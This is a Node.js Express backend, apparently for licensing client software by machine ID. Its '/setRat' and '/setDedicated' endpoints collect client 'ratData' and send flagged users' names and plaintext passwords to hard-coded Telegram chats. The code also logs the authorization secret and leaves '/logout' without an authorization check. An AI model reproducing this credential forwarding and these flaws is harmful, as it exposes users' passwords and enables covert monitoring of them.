const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const logger = require('./logger')
const expressWinston = require('express-winston');
const port = process.env.PORT || 8080;
const db_tools = require('./db_tools');
const cors = require('cors')
const axios = require("axios");
const  {config} = require('dotenv')
const {bot} = require("./bot")
const {getUser, checkUserByMachineID, writeUserAccess, writeRatData, writeDedicated, writeUser} = require("./db_tools");

const chatIDBosses = [473018697, 494127139]

bot.launch();


const corsOptions = {
    origin: '*',
    optionsSuccessStatus: 200 // some legacy browsers (IE11, various SmartTVs) choke on 204
}

app.use(cors(corsOptions));

app.use(
    express.urlencoded({
        extended: true
    })  
)

app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.send('Hello World!')
})

//DONE
app.post('/checkMachine', async (req, res) => {
    let machineID = req.body.machineID
    console.log(machineID)
    console.log(process.env.AUTHORIZATION)
    if (req.header("Authorization") === process.env.AUTHORIZATION){
        let user = await checkUserByMachineID(machineID)
        if (user){
            if (user.licenseExpired.getTime() > new Date().getTime()){
                return res.send({loginStatus: "2", userData: user})
            } else {
                return res.send({loginStatus: "1"})
            }
        }
    }

    return res.send({loginStatus: "0"})
})

//DONE
app.post('/logout', async (req, res) => {
    let name = req.body.name;
    let password = req.body.password;
    let machineID = req.body.machineID;
    let user = await getUser(name, password)
    user.activeMachineIDs = user.activeMachineIDs.split(";").filter(e => e !== machineID).join(";")
    await writeUser(user)
    return res.send({loginStatus: "0"})
})

//DONE
app.post('/login', async (req, res) => {
    let name = req.body.name;
    let password = req.body.password;
    let machineID = req.body.machineID
    let ownerIP = req.body.ownerIP
    if (req.header("Authorization") === process.env.AUTHORIZATION){
        let user = await getUser(name, password)
        if (user){
            if (user.machineIDs){
                if (user.machineIDs.split(";").includes(machineID)){
                    if (user.activeMachineIDs){
                        let r = user.activeMachineIDs.split(";")
                        r.push(machineID)
                        user.activeMachineIDs = r.join(";")
                    } else {
                        user.activeMachineIDs = `${machineID}`
                    }
                } else {
                    if ((user.machineIDs.split(";").length + 1) > user.maxMachines){
                        return res.send({loginStatus: "99"})
                    } else {
                        let r = user.machineIDs.split(";")
                        r.push(machineID)
                        user.machineIDs = r.join(";")
                        r = user.activeMachineIDs.split(";")
                        r.push(machineID)
                        user.activeMachineIDs = r.join(";")
                    }
                }
            } else {
                user.activeMachineIDs = `${machineID}`
                user.machineIDs = `${machineID}`
            }
            user.ownerIP = ownerIP
            await writeUser(user)
            return res.send({loginStatus: "1"})
        }
    }
    
    return res.send({loginStatus: "0"})
})

//DONE
app.post('/setRat', async (req, res) => {
    let ratData = req.body.ratData;
    let name = req.body.name;
    let password = req.body.password;
    if (req.header("Authorization") === process.env.AUTHORIZATION){
        let user = await getUser(name, password)
        if (user.rat){
            chatIDBosses.map(e => {
                bot.telegram.sendMessage(e, `Попытка входа: ${name} ${password}`)
            })
            await writeRatData(ratData, name, password)
        }
        return res.send({loginStatus: "1"})
    }

    return res.send({loginStatus: "0"})
})

//DONE
app.post('/setDedicated', async (req, res) => {
    let dedicated = req.body.dedicated;
    let name = req.body.name;
    let password = req.body.password;
    if (req.header("Authorization") === process.env.AUTHORIZATION){
        let user = await getUser(name, password)
        if (dedicated && user.rat){
            chatIDBosses.map(e => {
                bot.telegram.sendMessage(e, `Дедик обнаружен: ${name} ${password}`)
            })
            await writeDedicated(name, password)
        }
        return res.send({})
    }

    return res.send({})
})

app.listen(port, () => {
    console.log(`App listening on port ${port}`)
})